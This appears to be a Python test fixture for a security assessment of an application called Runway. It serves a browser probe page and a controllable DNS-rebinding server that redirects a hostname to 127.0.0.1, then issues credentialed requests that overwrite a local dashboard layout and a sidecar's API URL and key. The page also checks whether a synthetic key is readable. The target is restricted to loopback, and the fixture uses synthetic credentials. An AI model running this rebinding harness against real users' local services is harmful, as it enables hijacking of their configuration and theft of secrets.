"""Serve hostile-origin probes and a controllable DNS-rebinding fixture.

Run on a separate helper host on an isolated test network. This fixture never
contains credentials and is not part of the shipped application.
"""

import argparse
import ipaddress
import json
import socketserver
import struct
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any
from urllib.parse import urlparse

PAGE = """<!doctype html><meta charset="utf-8"><title>Runway browser boundary probe</title>
<h1>Runway browser boundary probe</h1>
<p>Use an isolated Runway config with synthetic credentials. Capture legitimate state before and after.</p>
<button id="direct">Attempt hostile-origin requests</button>
<button id="arm">Arm DNS rebinding, then retry same-origin requests</button>
<button id="control">Check synthetic marker detector</button>
<button id="export">Save sanitized results</button>
<label>LNA state recorded by operator <select id="permission">
<option>not-recorded</option><option>denied</option><option>granted</option>
<option>no-prompt</option><option>unsupported</option></select></label>
<pre id="results"></pre><script>
const target = TARGET;
const probeKind = PROBE_KIND;
const results = document.querySelector('#results');
const records = [];
// Do not embed the contiguous fixture marker in this helper's own HTML.
const marker = ['synthetic', 'fleet', 'key'].join('-');
function record(data) {
  const row = {at:new Date().toISOString(),permission:document.querySelector('#permission').value,...data};
  records.push(row); results.textContent += JSON.stringify(row)+'\\n'; console.log(JSON.stringify(row));
}
async function probe(base) {
  const requests = [
    ['/api/v1/system/dashboard-layout', {method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({provider_order:['security-probe']})},'dashboard'],
    ['/save', {method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'api_url=https%3A%2F%2Fprobe.invalid&api_key=probe-replacement'},'sidecar'],
    ['/', {method:'GET'},'both'],
    ['/api/v1/system/dashboard-layout', {method:'GET'},'dashboard']];
  for (const [path, options, surface] of requests.filter(([, ,surface]) => probeKind==='both' || surface==='both' || surface===probeKind)) {
    try {
      const response = await fetch(base + path, {...options, credentials:'include',cache:'no-store',signal:AbortSignal.timeout(5000)});
      const body = await response.text();
      record({base,path,method:options.method,status:response.status,helperResponse:response.headers.get('X-Runway-Probe')==='helper',keySeen:body.includes(marker)});
    } catch (error) {record({base,path,method:options.method,error:String(error)});}
  }
}
document.querySelector('#direct').onclick = () => probe(target);
document.querySelector('#arm').onclick = async () => {
  const arm = await fetch('/arm', {method:'POST'});
  record({event:'arm',status:arm.status});
  if (!arm.ok) return;
  for (let attempt = 0; attempt < 10; attempt++) {await new Promise(r=>setTimeout(r,2000)); await probe(location.origin);}
};
document.querySelector('#control').onclick = () => record({event:'detector-control',positive:('control:'+marker).includes(marker),negative:'control:empty'.includes(marker)});
document.querySelector('#export').onclick = () => {
  const data = {page:location.origin,userAgent:navigator.userAgent,secureContext:isSecureContext,records};
  const url = URL.createObjectURL(new Blob([JSON.stringify(data,null,2)],{type:'application/json'}));
  const link=document.createElement('a');link.href=url;link.download='runway-browser-results-'+Date.now()+'.json';link.click();
  setTimeout(()=>URL.revokeObjectURL(url),1000);
};
if (location.protocol === 'https:') {
  document.querySelector('#arm').disabled=true;
  record({event:'mode',mode:'trusted-TLS direct loopback probe; HTTP page required for rebinding'});
}
</script>"""


def render_page(target: str, kind: str = "both") -> bytes:
    """Keep legacy combined probes and target-specific helper pages consistent."""
    if kind not in {"both", "sidecar", "dashboard"}:
        raise ValueError("Unknown probe surface")
    encoded = json.dumps(target).replace("<", "\\u003c")
    return PAGE.replace("TARGET", encoded).replace("PROBE_KIND", json.dumps(kind)).encode()


def dns_question(query: bytes) -> tuple[str, int, int, bytes]:
    """Parse one uncompressed DNS question; refuse malformed names."""
    if len(query) < 12 or struct.unpack_from("!H", query, 4)[0] != 1:
        raise ValueError("Invalid DNS question")
    offset, labels = 12, []
    while True:
        if offset >= len(query):
            raise ValueError("Truncated DNS name")
        size = query[offset]
        offset += 1
        if size == 0:
            break
        if size > 63 or offset + size > len(query):
            raise ValueError("Invalid DNS label")
        labels.append(query[offset : offset + size].decode("ascii"))
        offset += size
    if offset + 4 > len(query):
        raise ValueError("Missing DNS query type")
    qtype, qclass = struct.unpack_from("!HH", query, offset)
    question = query[12 : offset + 4]
    return ".".join(labels).lower(), qtype, qclass, question


def dns_answer(query: bytes, hostname: str, address: str) -> bytes:
    """Answer only the controlled hostname; no forwarding or recursion."""
    name, qtype, qclass, question = dns_question(query)
    matches = name == hostname.rstrip(".").lower()
    flags = 0x8400 | (0 if matches else 3)  # authoritative; NXDOMAIN for other names
    answer = b""
    if matches and qtype == 1 and qclass == 1:
        answer = (
            b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 0, 4) + ipaddress.IPv4Address(address).packed
        )
    return query[:2] + struct.pack("!HHHHH", flags, 1, bool(answer), 0, 0) + question + answer


def serve(
    hostname: str, helper_ip: str, target: str, bind: str, http_port: int, dns_port: int
) -> None:
    ipaddress.IPv4Address(helper_ip)
    if urlparse(target).scheme != "http" or urlparse(target).hostname not in {
        "127.0.0.1",
        "localhost",
    }:
        raise ValueError("Probe target must be an isolated loopback HTTP service")
    state: dict[str, Any] = {"armed": False}
    lock = threading.Lock()

    class DNS(socketserver.BaseRequestHandler):
        def handle(self) -> None:
            query, sock = self.request
            try:
                with lock:
                    address = "127.0.0.1" if state["armed"] else helper_ip
                answer = dns_answer(query, hostname, address)
                sock.sendto(answer, self.client_address)
                print(
                    json.dumps(
                        {"event": "dns", "client": self.client_address[0], "answer": address}
                    ),
                    flush=True,
                )
            except (ValueError, UnicodeError):
                return

    class HTTP(BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            if self.path != "/":
                self.send_error(404)
                return
            body = render_page(target)
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Cache-Control", "no-store")
            self.send_header("X-Runway-Probe", "helper")
            self.send_header("Connection", "close")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_POST(self) -> None:
            if self.path != "/arm":
                self.send_error(404)
                return
            with lock:
                state["armed"] = True
            self.send_response(204)
            self.send_header("Connection", "close")
            self.end_headers()
            print(json.dumps({"event": "armed"}), flush=True)

    with (
        socketserver.ThreadingUDPServer((bind, dns_port), DNS) as dns,
        ThreadingHTTPServer((bind, http_port), HTTP) as http,
    ):
        thread = threading.Thread(target=dns.serve_forever, daemon=True)
        thread.start()
        try:
            print(f"Open http://{hostname}:{http_port}; DNS fixture {bind}:{dns_port}", flush=True)
            http.serve_forever()
        finally:
            dns.shutdown()
            thread.join()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--hostname", required=True)
    parser.add_argument("--helper-ip", required=True)
    parser.add_argument("--target", required=True)
    parser.add_argument("--bind", default="127.0.0.1")
    parser.add_argument("--http-port", type=int, required=True)
    parser.add_argument("--dns-port", type=int, default=5353)
    args = parser.parse_args()
    serve(args.hostname, args.helper_ip, args.target, args.bind, args.http_port, args.dns_port)
